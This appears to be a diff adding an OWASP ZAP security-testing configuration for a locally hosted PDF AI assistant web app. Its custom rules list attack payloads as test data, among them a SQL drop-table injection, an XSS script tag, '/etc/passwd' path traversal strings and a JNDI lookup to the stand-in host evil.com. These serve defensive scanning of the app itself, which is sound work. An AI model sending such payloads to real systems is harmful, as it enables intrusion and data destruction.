@@ -1,0 +1,312 @@
+# OWASP ZAP Security Testing Configuration
+# This configuration file defines security tests for the PDF AI Assistant
+
+env:
+  contexts:
+    - name: "PDF AI Assistant"
+      urls:
+        - "http://localhost:3000"
+      includePaths:
+        - "http://localhost:3000/.*"
+      excludePaths:
+        - "http://localhost:3000/api/auth/callback.*"
+        - "http://localhost:3000/_next/.*"
+        - "http://localhost:3000/favicon.ico"
+      authentication:
+        method: "bearer"
+        parameters:
+          token: "${AUTH_TOKEN}"
+      sessionManagement:
+        method: "scriptBasedSessionManagement"
+
+  parameters:
+    failOnError: true
+    failOnWarning: false
+    progressToStdout: true
+
+jobs:
+  # Passive Security Scan
+  - type: passiveScan-config
+    parameters:
+      maxAlertsPerRule: 10
+      scanOnlyInScope: true
+      enableTags: false
+
+  # Spider/Crawl the application
+  - type: spider
+    parameters:
+      context: "PDF AI Assistant"
+      url: "http://localhost:3000"
+      maxDuration: 10
+      maxDepth: 5
+      acceptCookies: true
+      handleODataParametersVisited: false
+      parseComments: true
+      parseRobotsTxt: true
+      parseSitemapXml: true
+      parseSVNEntries: true
+      parseGit: true
+      postForm: true
+      processForm: true
+      requestWaitTime: 200
+      sendRefererHeader: true
+      threadCount: 5
+
+  # AJAX Spider for SPA content
+  - type: spiderAjax
+    parameters:
+      context: "PDF AI Assistant"
+      url: "http://localhost:3000"
+      inScopeOnly: true
+      maxDuration: 10
+      maxCrawlDepth: 5
+      numberOfBrowsers: 2
+      runOnlyIfModern: true
+
+  # Active Security Scan
+  - type: activeScan
+    parameters:
+      context: "PDF AI Assistant"
+      policy: "Default Policy"
+      maxRuleDurationInMins: 5
+      maxScanDurationInMins: 30
+      addQueryParam: false
+      defaultPolicy: "Default Policy"
+      delayInMs: 0
+      handleAntiCSRFTokens: true
+      inScopeOnly: true
+      scanHeadersAllRequests: true
+      threadPerHost: 2
+    policyDefinition:
+      defaultStrength: "MEDIUM"
+      defaultThreshold: "MEDIUM"
+      rules:
+        # Injection vulnerabilities
+        - id: 40018 # SQL Injection
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40019 # SQL Injection - MySQL
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40020 # SQL Injection - PostgreSQL
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40021 # SQL Injection - Hypersonic SQL
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40022 # SQL Injection - Oracle
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40023 # SQL Injection - MongoDB
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40024 # Generic SQL Injection
+          strength: "HIGH"
+          threshold: "LOW"
+          
+        # XSS vulnerabilities
+        - id: 40012 # Cross Site Scripting (Reflected)
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40013 # Cross Site Scripting (Persistent)
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40014 # Cross Site Scripting (Persistent) - Prime
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40015 # Cross Site Scripting (Persistent) - Spider
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40016 # Cross Site Scripting (Persistent) - Tag
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40017 # Cross Site Scripting (DOM Based)
+          strength: "HIGH"
+          threshold: "LOW"
+
+        # File upload vulnerabilities
+        - id: 40029 # Server Side Request Forgery
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40030 # LDAP Injection
+          strength: "MEDIUM"
+          threshold: "MEDIUM"
+        - id: 40031 # Path Traversal
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 40032 # Remote File Inclusion
+          strength: "HIGH"
+          threshold: "LOW"
+
+        # Authentication and session management
+        - id: 10003 # Authentication Bypass
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 10016 # Session Fixation
+          strength: "MEDIUM"
+          threshold: "MEDIUM"
+        - id: 10025 # Weak Authentication Method
+          strength: "HIGH"
+          threshold: "LOW"
+
+        # API security
+        - id: 90022 # Application Error Disclosure
+          strength: "MEDIUM"
+          threshold: "MEDIUM"
+        - id: 90023 # XML External Entity Attack
+          strength: "HIGH"
+          threshold: "LOW"
+        - id: 90019 # Server Side Include
+          strength: "MEDIUM"
+          threshold: "MEDIUM"
+
+  # API Security Testing
+  - type: openapi
+    parameters:
+      apiFile: "http://localhost:3000/api/openapi.json"
+      apiUrl: "http://localhost:3000"
+      context: "PDF AI Assistant"
+
+  # Report Generation
+  - type: report
+    parameters:
+      template: "traditional-html"
+      reportDir: "test-results/security"
+      reportFile: "zap-security-report"
+      reportTitle: "PDF AI Assistant Security Test Report"
+      reportDescription: "Comprehensive security assessment of the PDF AI Assistant application"
+
+  - type: report
+    parameters:
+      template: "traditional-json"
+      reportDir: "test-results/security"
+      reportFile: "zap-security-report"
+
+  - type: report
+    parameters:
+      template: "traditional-xml"
+      reportDir: "test-results/security"
+      reportFile: "zap-security-report"
+
+# Custom security test rules
+rules:
+  # File Upload Security
+  - name: "PDF Upload Validation"
+    description: "Test PDF upload endpoint for security vulnerabilities"
+    endpoints:
+      - "/api/documents/upload"
+    tests:
+      - type: "malicious_file_upload"
+        payloads:
+          - "malicious.pdf.exe"
+          - "script.pdf.js"
+          - "../../../etc/passwd"
+          - "large_file.pdf" # >50MB
+      - type: "content_type_bypass"
+        headers:
+          - "Content-Type: application/pdf"
+          - "Content-Type: text/html"
+          - "Content-Type: application/javascript"
+
+  # Authentication Security
+  - name: "JWT Token Security"
+    description: "Test JWT token handling and validation"
+    endpoints:
+      - "/api/documents"
+      - "/api/search"
+      - "/api/admin/*"
+    tests:
+      - type: "token_manipulation"
+        payloads:
+          - "invalid.jwt.token"
+          - "expired.jwt.token"
+          - "malformed_jwt"
+          - ""
+      - type: "privilege_escalation"
+        scenarios:
+          - "regular_user_to_admin"
+          - "anonymous_to_authenticated"
+
+  # API Rate Limiting
+  - name: "Rate Limiting Tests"
+    description: "Test API rate limiting implementation"
+    endpoints:
+      - "/api/search"
+      - "/api/documents/upload"
+      - "/api/auth/signin"
+    tests:
+      - type: "rate_limit_bypass"
+        requests_per_minute: 1000
+        variations:
+          - "different_user_agents"
+          - "different_ip_addresses"
+          - "different_request_headers"
+
+  # Input Validation
+  - name: "Search Input Validation"
+    description: "Test search endpoint input validation"
+    endpoints:
+      - "/api/search"
+    tests:
+      - type: "injection_attacks"
+        payloads:
+          - "'; DROP TABLE documents; --"
+          - "<script>alert('xss')</script>"
+          - "../../../etc/passwd"
+          - "${jndi:ldap://evil.com/x}"
+          - "{{7*7}}"
+      - type: "buffer_overflow"
+        payloads:
+          - "A" * 10000  # Very long string
+          - "search query with \x00 null bytes"
+
+  # Admin Panel Security
+  - name: "Admin Panel Security"
+    description: "Test admin panel security and access controls"
+    endpoints:
+      - "/api/admin/performance-metrics"
+      - "/api/admin/usage-analytics"
+      - "/api/admin/batch-status"
+      - "/api/admin/cleanup-orphaned"
+    tests:
+      - type: "authorization_bypass"
+        scenarios:
+          - "no_token"
+          - "invalid_token"
+          - "regular_user_token"
+      - type: "parameter_pollution"
+        parameters:
+          - "user_id=1&user_id=2"
+          - "from=2024-01-01&from=../../../etc/passwd"
+
+# Security scan policies
+policies:
+  - name: "API Security Policy"
+    description: "Focused on API security testing"
+    rules:
+      - "SQL Injection"
+      - "XSS"
+      - "Path Traversal"
+      - "Authentication Bypass"
+      - "Authorization Issues"
+      - "Input Validation"
+      - "SSRF"
+      - "XXE"
+
+  - name: "File Upload Policy"
+    description: "Focused on file upload security"
+    rules:
+      - "Path Traversal"
+      - "Remote File Inclusion"
+      - "Malicious File Upload"
+      - "Content Type Validation"
+      - "File Size Limits"
+
+  - name: "Authentication Policy"
+    description: "Focused on authentication and session management"
+    rules:
+      - "Authentication Bypass"
+      - "Session Fixation"
+      - "Weak Authentication"
+      - "JWT Security"
+      - "Privilege Escalation"
